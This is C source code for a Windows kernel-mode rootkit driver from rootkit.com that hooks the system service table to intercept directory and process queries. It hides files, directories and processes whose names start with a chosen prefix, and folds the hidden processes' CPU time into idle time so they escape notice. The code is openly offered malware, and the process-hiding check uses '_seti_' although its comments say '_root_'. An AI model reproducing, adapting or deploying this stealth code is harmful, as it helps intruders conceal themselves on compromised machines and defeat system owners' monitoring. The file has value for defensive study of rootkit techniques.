// BASIC ROOTKIT that hides files, directories, and processes
// ----------------------------------------------------------
// v0.1 - Initial, Greg Hoglund (hoglund@rootkit.com)
// v0.2 - DirEntry struct fixed, b00lean (b00lean@rootkit.com)
// v0.3 - Added defines to compile on W2K, and comments.  Rich
// v0.4 - Fixed bug while manipulating _SYSTEM_PROCESS array.
//		  Added code to hide process times of the _root_*'s. Creative
// ----------------------------------------------------------
// visit www.rootkit.com for latest rootkit warez
// ----------------------------------------------------------

#include "ntddk.h"
#include "stdarg.h"
#include "stdio.h"
#include "ntiologc.h"

#define DWORD unsigned long
#define WORD unsigned short
#define BOOL unsigned long

// Length of process name (rounded up to next DWORD)
#define PROCNAMELEN     20
// Maximum length of NT process name
#define NT_PROCNAMELEN  16

ULONG gProcessNameOffset;

typedef struct _FILETIME { // ft 
    DWORD dwLowDateTime; 
    DWORD dwHighDateTime; 
} FILETIME; 

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; //Used only in checked build
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

struct _SYSTEM_THREADS
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                           WaitTime;
        PVOID                           StartAddress;
        CLIENT_ID                       ClientIs;
        KPRIORITY                       Priority;
        KPRIORITY                       BasePriority;
        ULONG                           ContextSwitchCount;
        ULONG                           ThreadState;
        KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
        ULONG                           NextEntryDelta;
        ULONG                           ThreadCount;
        ULONG                           Reserved[6];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ProcessName;
        KPRIORITY                       BasePriority;
        ULONG                           ProcessId;
        ULONG                           InheritedFromProcessId;
        ULONG                           HandleCount;
        ULONG                           Reserved2[2];
        VM_COUNTERS                     VmCounters;
        IO_COUNTERS                     IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS          Threads[1];
};

struct _SYSTEM_PROCESSOR_TIMES
{
		LARGE_INTEGER					IdleTime;
		LARGE_INTEGER					KernelTime;
		LARGE_INTEGER					UserTime;
		LARGE_INTEGER					DpcTime;
		LARGE_INTEGER					InterruptTime;
		ULONG							InterruptCount;
};
#if 0
typedef enum _WXPFILE_INFORMATION_CLASS {
// end_wdm
    FileDirectoryInformation         = 1,
    FileFullDirectoryInformation,   // 2
    FileBothDirectoryInformation,   // 3
    FileBasicInformation,           // 4  wdm
    FileStandardInformation,        // 5  wdm
    FileInternalInformation,        // 6
    FileEaInformation,              // 7
    FileAccessInformation,          // 8
    FileNameInformation,            // 9
    FileRenameInformation,          // 10
    FileLinkInformation,            // 11
    FileNamesInformation,           // 12
    FileDispositionInformation,     // 13
    FilePositionInformation,        // 14 wdm
    FileFullEaInformation,          // 15
    FileModeInformation,            // 16
    FileAlignmentInformation,       // 17
    FileAllInformation,             // 18
    FileAllocationInformation,      // 19
    FileEndOfFileInformation,       // 20 wdm
    FileAlternateNameInformation,   // 21
    FileStreamInformation,          // 22
    FilePipeInformation,            // 23
    FilePipeLocalInformation,       // 24
    FilePipeRemoteInformation,      // 25
    FileMailslotQueryInformation,   // 26
    FileMailslotSetInformation,     // 27
    FileCompressionInformation,     // 28
    FileObjectIdInformation,        // 29
    FileCompletionInformation,      // 30
    FileMoveClusterInformation,     // 31
    FileQuotaInformation,           // 32
    FileReparsePointInformation,    // 33
    FileNetworkOpenInformation,     // 34
    FileAttributeTagInformation,    // 35
    FileTrackingInformation,        // 36
    FileIdBothDirectoryInformation,     // 37
    FileIdFullDirectoryInformation, // 38
    FileValidDataLengthInformation, // 39
    FileShortNameInformation,       // 40
        FileMaximumInformation
// begin_wdm
} WXPFILE_INFORMATION_CLASS, *PWXPFILE_INFORMATION_CLASS;
#endif
#define FileIdFullDirectoryInformation 38
#define FileIdBothDirectoryInformation 37


typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
        IN HANDLE hFile,
        IN HANDLE hEvent OPTIONAL,
        IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
        IN PVOID IoApcContext OPTIONAL,
        OUT PIO_STATUS_BLOCK pIoStatusBlock,
        OUT PVOID FileInformationBuffer,
        IN ULONG FileInformationBufferLength,
        IN FILE_INFORMATION_CLASS FileInfoClass,
        IN BOOLEAN bReturnOnlyOneEntry,
        IN PUNICODE_STRING PathMask OPTIONAL,
        IN BOOLEAN bRestartQuery
);

NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
                        IN PVOID SystemInformation,
                        IN ULONG SystemInformationLength,
                        OUT PULONG ReturnLength);

typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
    HANDLE hFile,
        HANDLE hEvent,
        PIO_APC_ROUTINE IoApcRoutine,
        PVOID IoApcContext,
        PIO_STATUS_BLOCK pIoStatusBlock,
        PVOID FileInformationBuffer,
        ULONG FileInformationBufferLength,
        FILE_INFORMATION_CLASS FileInfoClass,
        BOOLEAN bReturnOnlyOneEntry,
        PUNICODE_STRING PathMask,
        BOOLEAN bRestartQuery
);

typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
            ULONG SystemInformationCLass,
                        PVOID SystemInformation,
                        ULONG SystemInformationLength,
                        PULONG ReturnLength
);

ZWQUERYSYSTEMINFORMATION        OldZwQuerySystemInformation;
ZWQUERYDIRECTORYFILE            OldZwQueryDirectoryFile;

LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;

/* Find the offset of the process name within the executive process
   block.  We do this by searching for the first occurance of "System"
   in the current process when the device driver is loaded. */

void GetProcessNameOffset()
{
  PEPROCESS curproc = PsGetCurrentProcess();
  int i;
  for( i = 0; i < 3*PAGE_SIZE; i++ ) 
    {
      if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
	{
	  gProcessNameOffset = i;
	}
    }
}

/* Copy the process name into the specified buffer.  */

BOOL GetProcessName( PCHAR theName )
{
  PEPROCESS       curproc;
  char            *nameptr;
  ULONG           i;
  KIRQL           oldirql;

  if( gProcessNameOffset ) 
    {
      curproc = PsGetCurrentProcess();
      nameptr   = (PCHAR) curproc + gProcessNameOffset;
      strncpy( theName, nameptr, NT_PROCNAMELEN );
      theName[NT_PROCNAMELEN] = 0; /* NULL at end */
      return TRUE;
    } 
  return FALSE;
}

/* Given a directory entry, return the next
   directory entry in the linked list. */

DWORD getDirEntryLenToNext( 
                IN PVOID FileInformationBuffer,
        IN FILE_INFORMATION_CLASS FileInfoClass
)
{
        DWORD result = 0;
        switch(FileInfoClass){
                case FileDirectoryInformation:
                        result = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileFullDirectoryInformation:
                        result = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileIdFullDirectoryInformation:
                        result = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileBothDirectoryInformation:
                        result = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileIdBothDirectoryInformation:
                        result = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
                case FileNamesInformation:
                        result = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                        break;
        }
        return result;
}

/* Given two directory entries, link them together in a list. */

void setDirEntryLenToNext( 
                IN PVOID FileInformationBuffer,
        IN FILE_INFORMATION_CLASS FileInfoClass,
                IN DWORD value
)
{
        switch(FileInfoClass){
                case FileDirectoryInformation:
                        ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileFullDirectoryInformation:
                        ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileIdFullDirectoryInformation:
                        ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileBothDirectoryInformation:
                        ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileIdBothDirectoryInformation:
                        ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
                case FileNamesInformation:
                        ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
                        break;
        }
}
        
/* Return the filename of the specified directory entry. */

PVOID getDirEntryFileName( 
                IN PVOID FileInformationBuffer,
        IN FILE_INFORMATION_CLASS FileInfoClass
)
{
        PVOID result = 0;
        switch(FileInfoClass){
                case FileDirectoryInformation:
                        result = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileFullDirectoryInformation:
                        result =(PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileIdFullDirectoryInformation:
                        result =(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileBothDirectoryInformation:
                        result =(PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileIdBothDirectoryInformation:
                        result =(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
                case FileNamesInformation:
                        result =(PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
                        break;
        }
        return result;
}

/* Return the length of the filename of the specified directory
   entry. */

ULONG getDirEntryFileLength( 
                IN PVOID FileInformationBuffer,
        IN FILE_INFORMATION_CLASS FileInfoClass
)
{
        ULONG result = 0;
        switch(FileInfoClass){
                case FileDirectoryInformation:
                        result = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileFullDirectoryInformation:
                        result =(ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileIdFullDirectoryInformation:
                        result =(ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileBothDirectoryInformation:
                        result =(ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileIdBothDirectoryInformation:
                        result =(ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
                case FileNamesInformation:
                        result =(ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
                        break;
        }
        return result;
}

/* NT's ZwQueryDirectoryFile() returns a a linked list of directory
   entries.  The function below imitates it, except it removes from
   the list any entry who's name begins with "_root_". */

NTSTATUS NewZwQueryDirectoryFile(
        IN HANDLE hFile,
        IN HANDLE hEvent OPTIONAL,
        IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
        IN PVOID IoApcContext OPTIONAL,
        OUT PIO_STATUS_BLOCK pIoStatusBlock,
        OUT PVOID FileInformationBuffer,
        IN ULONG FileInformationBufferLength,
        IN FILE_INFORMATION_CLASS FileInfoClass,
        IN BOOLEAN bReturnOnlyOneEntry,
        IN PUNICODE_STRING PathMask OPTIONAL,
        IN BOOLEAN bRestartQuery
)
{
        NTSTATUS rc;
        CHAR aProcessName[PROCNAMELEN];
                
        GetProcessName( aProcessName );
        DbgPrint("rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);

        rc=((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile)) (
                        hFile,                                                  /* this is the directory handle */
                        hEvent,
                        IoApcRoutine,
                        IoApcContext,
                        pIoStatusBlock,
                        FileInformationBuffer,
                        FileInformationBufferLength,
                        FileInfoClass,
                        bReturnOnlyOneEntry,
                        PathMask,
                        bRestartQuery);

        if( NT_SUCCESS( rc ) && 
                (FileInfoClass == FileDirectoryInformation ||
                 FileInfoClass == FileFullDirectoryInformation ||
                 FileInfoClass == FileIdFullDirectoryInformation ||
                 FileInfoClass == FileBothDirectoryInformation ||
                 FileInfoClass == FileIdBothDirectoryInformation ||
                 FileInfoClass == FileNamesInformation )
                ) 
        {
                if(0 == memcmp(aProcessName, "_root_", 6))
                {
                        DbgPrint("rootkit: detected file/directory query from _root_ process\n");
                }
                else
                {
                        PVOID p = FileInformationBuffer;
                        PVOID pLast = NULL;
                        BOOL bLastOne;
                        do 
                        {
                                bLastOne = !getDirEntryLenToNext(p,FileInfoClass);
                                
                                // compare directory-name prefix with '_root_' to decide if to hide or not.

                                if (getDirEntryFileLength(p,FileInfoClass) >= 12) {
                                        if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)"_\0r\0o\0o\0t\0_\0", 12 ) == 12 ) 
                                        {
                                                if( bLastOne ) 
                                                {
                                                        if( p == FileInformationBuffer ) rc = 0x80000006;
                                                        else setDirEntryLenToNext(pLast,FileInfoClass, 0);
                                                        break;
                                                } 
                                                else 
                                                {
                                                        int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
                                                        int iLeft = (DWORD)FileInformationBufferLength - iPos - getDirEntryLenToNext(p,FileInfoClass);
                                                        RtlCopyMemory( p, (PVOID)( (char *)p + getDirEntryLenToNext(p,FileInfoClass) ), (DWORD)iLeft );
                                                        continue;
                                                }
                                        }
                                }
                                pLast = p;
                                p = ((char *)p + getDirEntryLenToNext(p,FileInfoClass) );
                        } while( !bLastOne );
                }
        }
        return(rc);
}

/* NT's ZwQuerySystemInformation() returns a linked list of processes.
   The function below imitates it, except it removes from the list any
   process who's name begins with "_root_". */

NTSTATUS NewZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
                        IN PVOID SystemInformation,
                        IN ULONG SystemInformationLength,
                        OUT PULONG ReturnLength
)
{
        NTSTATUS rc;
        CHAR aProcessName[PROCNAMELEN];
                
        GetProcessName( aProcessName );
        DbgPrint("rootkit: NewZwQuerySystemInformation() from %s\n", aProcessName);

        rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
                        SystemInformationClass,
                        SystemInformation,
                        SystemInformationLength,
                        ReturnLength );

        if( NT_SUCCESS( rc ) ) 
        {
                // double check the process name, if it starts w/ '_root_' DO NOT
                // apply any stealth
                if(0 == memcmp(aProcessName, "_seti_", 6))
                {
                        DbgPrint("rootkit: detected system query from _root_ process\n");
                }
                else if( 5 == SystemInformationClass )
                {
                        // this is a process list, look for process names that start with
                        // '_root_'
                        int iChanged = 0;
						struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
                        struct _SYSTEM_PROCESSES *prev = NULL;
						
                        while(curr)
                        {       
                                //struct _SYSTEM_PROCESSES *next = ((char *)curr += curr->NextEntryDelta);
                                
                                ANSI_STRING process_name;
                                RtlUnicodeStringToAnsiString( &process_name, &(curr->ProcessName), TRUE);
                                if( (0 < process_name.Length) && (255 > process_name.Length) )
                                {
                                        if(0 == memcmp( process_name.Buffer, "_seti_", 6))
                                        {
                                                //////////////////////////////////////////////
                                                // we have a winner!
                                                //////////////////////////////////////////////
                                                char _output[255];
                                                char _pname[255];
                                                memset(_pname, 0, 255);
                                                memcpy(_pname, process_name.Buffer, process_name.Length);

                                                sprintf(        _output, 
                                                                        "rootkit: hiding process, pid: %d\tname: %s\r\n", 
                                                                        curr->ProcessId, 
                                                                        _pname);
                                                DbgPrint(_output);

												iChanged = 1;

												m_UserTime.QuadPart += curr->UserTime.QuadPart;
												m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

                                                if(prev)
                                                {
                                                        if(curr->NextEntryDelta)
                                                        {
                                                                // make prev skip this entry
                                                                prev->NextEntryDelta += curr->NextEntryDelta;
                                                        }
                                                        else
                                                        {
                                                                // we are last, so make prev the end
                                                                prev->NextEntryDelta = 0;
                                                        }
                                                }
                                                else
                                                {
                                                        if(curr->NextEntryDelta)
                                                        {
                                                                // we are first in the list, so move it forward
                                                                (char *)SystemInformation += curr->NextEntryDelta;
                                                        }
                                                        else
                                                        {
                                                                // we are the only process!
                                                                SystemInformation = NULL;
                                                        }
                                                }
                                        }
                                }
								else
								{
									//add the times of _root_* processes to the idle process
									curr->UserTime.QuadPart += m_UserTime.QuadPart;
									curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
									m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
								}


                                RtlFreeAnsiString(&process_name);
                                
								if (0 == iChanged)
									prev = curr;
								else
									iChanged = 0;

                                if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
                                else curr = NULL;
                        }
                }
				else if (8 == SystemInformationClass)			//SystemProcessorTimes
				{
					struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;

					times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
				}

        }
        return(rc);
}

/* This device driver doesn't service I/O requests, so we provide only
   a dummy I/O dispatch routine. */

NTSTATUS
OnStubDispatch(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP           Irp
    )
{
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    IoCompleteRequest (Irp,
                       IO_NO_INCREMENT
                       );
    return Irp->IoStatus.Status;
}

/* Upon unloading this device driver, restore NT's original directory
   and process query functions. */

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
        DbgPrint("ROOTKIT: OnUnload called\n");

        // unhook system calls
        _asm cli
        (ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile))     =OldZwQueryDirectoryFile;
        (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation)) = OldZwQuerySystemInformation;
        _asm sti
}

/* Upon loading this device driver, 1) establish the offset of process
   names within the process block, 2) register the I/O and unload
   handlers, and 3) substitue the directory and process query
   functions with our stealthy imitations. */

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
  int i;

  DbgPrint("My Driver Loaded!");

  GetProcessNameOffset();

  // Register a dispatch function
  for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) 
    {
      theDriverObject->MajorFunction[i] = OnStubDispatch;
    }

  theDriverObject->DriverUnload  = OnUnload; 

  m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

  // save old system call locations
  OldZwQueryDirectoryFile=(ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile));
  OldZwQuerySystemInformation =(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

  // hook system calls
  _asm cli
    (ZWQUERYDIRECTORYFILE)  (SYSTEMSERVICE(ZwQueryDirectoryFile))=  NewZwQueryDirectoryFile;
  (ZWQUERYSYSTEMINFORMATION) (SYSTEMSERVICE(ZwQuerySystemInformation))= NewZwQuerySystemInformation;
  _asm sti
                                
    return STATUS_SUCCESS;
}
